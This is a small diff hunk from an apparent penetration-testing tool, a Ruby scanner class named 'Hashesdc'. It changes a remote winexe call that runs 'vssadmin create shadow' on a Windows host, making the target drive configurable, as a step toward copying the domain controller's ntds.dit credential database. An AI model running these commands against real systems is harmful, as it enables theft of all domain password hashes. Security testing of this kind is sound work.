@@ -128,7 +128,7 @@ class Hashesdc < Poet::Scanner
 				if free.gsub!(/,/, '').to_i > file_size.to_i
 
 					# Create Shadow copy
-					vss_create = winexe(smboptions, "CMD /C vssadmin create shadow /for=C:")
+					vss_create = winexe(smboptions, "CMD /C vssadmin create shadow /for=#{@ntds_drive}")
 					print_status("Creating shadow copy...")
 
 					# Check if created, get volume name and copy the ntds.dit
